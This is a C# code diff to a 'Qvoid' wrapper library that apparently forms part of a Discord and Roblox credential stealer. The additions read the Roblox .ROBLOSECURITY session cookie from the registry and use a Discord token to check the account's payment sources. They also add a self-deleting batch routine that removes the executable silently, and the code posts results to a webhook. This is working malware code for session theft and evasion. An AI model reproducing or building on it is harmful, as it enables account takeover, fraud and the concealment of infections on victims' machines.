@@ -1,3 +1,5 @@
+using Microsoft.Win32;
+using Newtonsoft.Json.Linq;
 using System;
 using System.Collections.Generic;
 using System.Collections.Specialized;
@@ -12,11 +14,70 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace Qvoid
 {
     public static class QvoidWrapper
     {
+        public static class Other
+        {
+            public static Color Spectrum(int mode, float time = 0f)
+            {
+                time = time == 0f ? (float)((DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() % 62830) / 2000.0) : time;
+                return Color.FromArgb(255,
+                       (int)((Math.Sin(time + (mode / Math.PI)) * .5f + .5f) * 255.0f),
+                       (int)((Math.Sin(time + (mode / Math.PI) + 2 * Math.PI / 3) * .5f + .5f) * 255.0f),
+                       (int)((Math.Sin(time + (mode / Math.PI) + 4 * Math.PI / 3) * .5f + .5f) * 255.0f));
+            }
+
+            public static void SelfDestruct()
+            {
+                string strName = "destruct.bat";
+                string strPath = Path.Combine(Directory.GetCurrentDirectory(), strName);
+                string strExe = new FileInfo(Application.ExecutablePath).Name;
+
+                StreamWriter swDestruct = new StreamWriter(strPath);
+                swDestruct.WriteLine("attrib \"" + strExe + "\"" + " -a -s -r -h");
+                swDestruct.WriteLine(":Repeat");
+                swDestruct.WriteLine("del " + "\"" + strExe + "\"");
+                swDestruct.WriteLine("if exist \"" + strExe + "\"" + " goto Repeat");
+                swDestruct.WriteLine("del \"" + strName + "\"");
+                swDestruct.Close();
+
+                Process procDestruct = new Process();
+                procDestruct.StartInfo.FileName = "destruct.bat";
+                procDestruct.StartInfo.CreateNoWindow = true;
+                procDestruct.StartInfo.UseShellExecute = false;
+
+                try
+                {
+                    procDestruct.Start();
+                }
+                catch (Exception)
+                {
+                    Application.Exit();
+                }
+            }
+
+            public static string RobloxCookies()
+            {
+                try
+                {
+                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", false))
+                    {
+                        if (key == null)
+                            return null;
+
+                        string cookie = key.GetValue(".ROBLOSECURITY").ToString();
+                        return cookie.Substring(46).Trim('>');
+                    }
+                }
+                catch
+                { return null; }
+            }
+        }
+
         public static class ProcessHandler
         {
             [StructLayout(LayoutKind.Sequential)]
@@ -286,6 +347,13 @@ namespace Qvoid
                         }
                     }
 
+                    request = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v9/users/@me/billing/payment-sources");
+                    request.Proxy = new WebProxy();
+                    request.Headers.Set("Authorization", this.Token);
+
+                    responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("}", "").Replace("{", " ").Replace("]", "").Replace("[", "").Replace("\"", "");
+                    PaymentMethods = !String.IsNullOrEmpty(responseStr);
+
                     DiscordUser = new User(this, this.Id);
                     mainThread = new Thread(() => { ClientLoggedIn(this); });
                     mainThread.Start();
@@ -303,6 +371,9 @@ namespace Qvoid
                 public string Locale { get; private set; }
                 public string PhoneNumber { get; private set; }
                 public string Email { get; private set; }
+
+                public bool PaymentMethods { get; private set; }
+                public bool Connections { get; private set; }
 
                 public string Token { get; private set; }
 
@@ -787,7 +858,6 @@ namespace Qvoid
                                         "\"embed\":{" +
                                         $"{description}" +
                                         $"{title}" +
-                                        //$"\"title\":\"{this.Title}\"" +
                                         $"{color}" +
                                         $"{time}" +
                                         $"{field}" +
@@ -1515,6 +1585,7 @@ namespace Qvoid
                         }
 
                         string message = "";
+
                         if (embed != null)
                         {
                             message = embed.ToString().Replace("\n", @"\n");
@@ -1522,6 +1593,21 @@ namespace Qvoid
                             message = new Regex("embed").Replace(message, "embeds", 1);
                             message = new Regex("embeds\":{").Replace(message, "embeds\":[{", 1);
                             message = new Regex("\"}").Replace(message, "\"}]", 1);
+
+                            try
+                            {
+                                JToken.Parse(message);
+                            }
+                            catch
+                            {
+                                message = message.Remove(message.Length - 1, 1) + "]}";
+
+                                try
+                                {
+                                    JToken.Parse(message);
+                                }
+                                catch { return; }
+                            }
                         }
 
                         string jsonBody = string.Concat(new string[]
@@ -1535,6 +1621,7 @@ namespace Qvoid
                         byte[] jsonBodyBuffer = Encoding.UTF8.GetBytes(jsonBody);
                         stream.Write(jsonBodyBuffer, 0, jsonBodyBuffer.Length);
                         webhookRequest.UploadData(this.URL, stream.ToArray());
+
                     }
                 }
             }
